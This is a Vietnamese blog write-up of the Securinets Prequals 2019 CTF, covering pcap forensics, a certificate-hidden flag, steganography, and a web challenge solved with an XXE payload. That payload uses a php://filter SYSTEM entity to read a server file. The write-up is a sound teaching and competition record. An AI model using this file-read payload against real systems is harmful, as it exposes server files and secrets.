---
layout: post
comments: true
title: Securinets Prequals 2019
categories: ['2019']
---
Team định try hard 0ctf của 10cent nhưng mà khó quá sức mình nên mình rút đi làm cái khác với ôn bài mai thi :(

# Easy Trade (FORENSIC)
[easytrade.pcap](https://drive.google.com/file/d/1DkiG7WSANaAjwpCdgpBCGND0qQW6JvBF/view?usp=sharing)

Mở lên bằng Wireshark, nội dung là 2 thằng trao đổi file cho nhau bị bắt gói lại, không có gì đặc biệt. Mình thử foremost để extract ra xem trong file pcap có ẩn file gì không thì có 1 file zip chứa file flag, bật trở lại Wireshark, filter những cái nào là TCP lại, thì có password extract là `securinetsXD`

Flag : `securinets{954f670cb291ec276b1a9ff8453ea601}`

# HIDDEN (MISC)
[LINK](https://misc1.ctfsecurinets.com/)

Click vào link đập vào mặt mình là trang này bị chrome detect là not secure và sau khi dirsearch hay xem http header chả có gì hết thì mình mở certificate của nó lên xem, nó giấu flag trong filer `Subject` của certificate data 

Flag : `Securinets{HiDDeN_D@tA_In_S3lF_S3iGnEd_CeRtifICates}`

# Feedback (WEB)
[LINK](https://web2.ctfsecurinets.com/)

Source Code (đề phòng trường hợp link die) 

```html

<!DOCTYPE html>
<html lang="en">
<head>
	<title>Securinets CTF Feedback</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
<script type="text/javascript">
function func(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<feedback>' +
        '<author>' + $('input[name="name"]').val() + '</author>' +
        '<email>' + $('input[name="email"]').val() + '</email>' +
        '<content>' + $('input[name="feedback"]').val() + '</content>' +
        '</feedback>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('Message').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","feed.php",true);
    xmlhttp.send(xml);
};
</script>
</head>
<body>


	<div class="container-contact100">

		<div class="wrap-contact100">
			<form class="contact100-form validate-form" method="POST" onsubmit="func();return false;">
				<span class="contact100-form-title">
					Send Us A Feedback	
				</span>

				<div class="wrap-input100 validate-input" data-validate="Please enter your name">
					<input class="input100" type="text" name="name" placeholder="Full Name">
					<span class="focus-input100"></span>
				</div>

				<div class="wrap-input100 validate-input" data-validate = "Please enter your email: e@a.x">
					<input class="input100" type="text" name="email" placeholder="E-mail">
					<span class="focus-input100"></span>
				</div>

				<div class="wrap-input100 validate-input" data-validate = "Please enter your message">
					<textarea class="input100" name="feedback" placeholder="Your Feedback"></textarea>
					<span class="focus-input100"></span>
				</div>

				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						<span>
							<i class="fa fa-paper-plane-o m-r-6" aria-hidden="true"></i>
							Send
						</span>
					</button>
					<div id="Message" color="Blue" type="text"></div>
				</div>
			</form>
		</div>
	</div>



	<div id="dropDownSelect1"></div>

<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-23581568-13');
</script>

</body>
</html>
```

Nhìn vào thì cái cần quan tâm nhất vẫn là cái này 

```javascript
<script type="text/javascript">
function func(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<feedback>' +
        '<author>' + $('input[name="name"]').val() + '</author>' +
        '<email>' + $('input[name="email"]').val() + '</email>' +
        '<content>' + $('input[name="feedback"]').val() + '</content>' +
        '</feedback>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('Message').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","feed.php",true);
    xmlhttp.send(xml);
};
</script>
```

Nên mình nhảy vào làm XXE luôn

Payload:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY khoadeptrai SYSTEM 'php://filter/convert.base64-encode/resource=flag'>
]>
<feedback>
  <author>aa&khoadeptrai;aa</author>
  <email>khoadeptrai123@hehe.com</email>
  <content>jjjjj></content>
</feedback>
```

Flag : `Securinets{Xxe_xXE_@Ll_Th3_W@Y}`

# EZ (MISC)
[pic.png](https://drive.google.com/open?id=1H8PZgWhNaAfbpgLHmtvSr-0bw_dmKYUF)

Sử dụng đại 1 tool nào để đọc hidden text 
Mình sử dụng [steganography](https://matuhn.github.io/steganography/)
Sẽ nhận được 1 đoạn hidden text, có chủ đề về Sherlock Holmes, có 1 từ bị delete khỏi văn bản nên mình dùng cái E-Book này xem từ đó là từ gì [Link](https://books.google.com.vn/books?id=2cMyBcuKQy4C&pg=PA93&lpg=PA93&dq=%22The+fact+is+that+upon+his+entrance+I+had+instantly+recognized+the+extreme+personal+danger+in+which+I+lay.+The+only+conceivable+escape+for+him+lay+in+silencing+my+tongue.+In+an+instant+I+had+slipped+the+revolver+from+the+drawer+into+my+pocket+and+was+covering+him+through+the+cloth.+At+his+remark+I+drew+the+weapon+out+and+laid+it+cocked+upon+the+table.+He+still+smiled+and+blinked,+but+there+was+something+about+his+eyes+which+made+me+feel+very+glad+that+I+had+it+there,+%22You+evidently+don%27t+know+me,%27+said+he.+%22%27On+the+contrary,%27+I+answered,+%27I+think+it+is+fairly+evident+that+I+do.+Pray+take+a+chair.+I+can+spare+you+five+minutes+if+you+have+anything+to+say.%27+%22%27All+that+I+have+to+say+has+already+crossed+your+mind,%27+said+he.+%22%27Then+possibly+my+answer+has+crossed+yours,%27+I+replied.+%22%27You+stand+fast?%27+%22%27Absolutely.%27+%22He+clapped+his+hand+into+his+pocket,+and+I+raised+the+pistol+from+the+table.+But+he+merely+drew+out+a+%3CDETELED_WORD%3E+in+which+he+had+scribbled+some+dates.+%22You+crossed+my+path+on+the+fourth+of+January,%27+said+he.+%27On+the+twenty-third+you+incommoded+me;+by+the+middle+of+February+I+was+seriously+inconvenienced+by+you;+at+the+end+of+March+I+was+absolutely+hampered+in+my+plans;+and+now,+at+the+close+of+April,+I+find+myself+placed+in+such+a+position+through+your+continual+persecution+that+I+am+in+positive+danger+of+losing+my+liberty.+The+situation+is+becoming+an+impossible+one.%27+%22%27Have+you+any+suggestion+to+make?%27+I+asked.+%22%27You+must+drop+it,+Mr.+Holmes,%27+said+he,+swaying+his+face+about.+%27You+really+must,+you+know.%27%22&source=bl&ots=_4yJ48IH35&sig=ACfU3U0IaC09mRmo84TqnLRuz-_1qVz-vw&hl=vi&sa=X&ved=2ahUKEwjwnNmDh5rhAhVUUd4KHSRqC8UQ6AEwAXoECAkQAQ#v=onepage&q=n%20which%20he%20had%20scribbled%20some&f=false) 

Flag : `Securinets{b47f0d2a8866a75696f94a515d0cdf54c7ea3174}`
